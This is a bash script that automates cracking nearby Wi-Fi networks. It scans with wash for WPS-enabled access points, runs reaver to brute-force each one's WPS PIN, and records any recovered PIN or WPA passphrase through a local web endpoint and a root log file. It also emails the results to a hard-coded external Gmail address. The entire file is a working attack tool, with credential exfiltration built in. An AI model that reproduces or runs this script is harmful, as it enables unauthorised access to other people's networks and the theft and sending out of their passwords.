#!/bin/bash
#ssid='9C:21:6A:2B:63:90 BC:D1:77:28:16:24 20:DC:E6:97:6C:86 00:66:4B:A0:F5:CC'
#ssid='9C:21:6A:2B:63:90'
INTERFACE=mon0
REMIND_EMAIL='hackers365@gmail.com'
LOG_FILE="/tmp/reaver_out.log"
MAX_NUM=10
MONTOR_LOG_BIN=`pwd`/tail_log.sh
URL_PREFIX='http://127.0.0.1/util?i_am_cmd=1'

touch /root/success.log
if [ $# -eq 1 ];then
   ssid="$1"
else
    wash -i $INTERFACE -o /tmp/wps.log &
    pid=$!;sleep 20;kill $pid
    tr -cd '\11\12\15\40-\176' < /tmp/wps.log > /tmp/wps_clean.log
    #sort version
    ssid=`cat /tmp/wps_clean.log|sed -n '3,$p'|sort -n -k3 -r|head -n $MAX_NUM|cut -d' ' -f1`
    cat /tmp/wps.log|sed -n '3,$p'|sort -n -k3 -r|head -n $MAX_NUM
fi
#set current script pid
echo "set current_reaver_sh_pid $$" | redis-cli
for i in $ssid
do
    result=`curl "${URL_PREFIX}&act=already_pj_bssid&bssid=${i}"`
    echo $result >> /tmp/tmp.log
    if echo $result|grep -q -i 'fail';then
        #echo 'begin pins bssid: ' $i
        curl "${URL_PREFIX}&act=set_current_pin_bssid&bssid=${i}"
        /usr/local/bin/reaver -i $INTERFACE -b $i -a -n -v -o $LOG_FILE &
        #$MONTOR_LOG_BIN $! $LOG_FILE
        echo "set current_reaver_pid $!" | redis-cli
        wait
        result=`tail -n3 $LOG_FILE`
        if echo $result|grep -q -i 'psk';then
            line_pin=`echo "$result"|grep 'WPS PIN'`
            if [ -n "$line_pin" ]; then
                pin=`echo $line_pin|cut -d"'" -f2`;
                if [ -n $pin ]; then
                    curl "${URL_PREFIX}&act=set_pin_psk&bssid=${i}&key=pin&value=${pin}"
                fi
            fi
            line_psk=`echo "$result"|grep 'WPA PSK'`
            if [ -n "$line_psk" ];then
                psk=`echo $line_psk|cut -d"'" -f2`;
                if [ -n $psk ]; then
                    curl "${URL_PREFIX}&act=set_pin_psk&bssid=${i}&key=psk&value=${psk}"
                fi
            fi

            echo "$result"|mutt -s 'get password' hackers365@gmail.com
            echo "######################" >> /root/success.log
            echo "bssid: $i">> /root/success.log
            echo "$result" >> /root/success.log
            echo "######################" >> /root/success.log
        fi
        echo "del current_pin_mac'" | redis-cli
        echo "del current_reaver_pid" | redis-cli
    fi
done
echo "del current_reaver_sh_pid" | redis-cli
echo '$exit$' >> $LOG_FILE
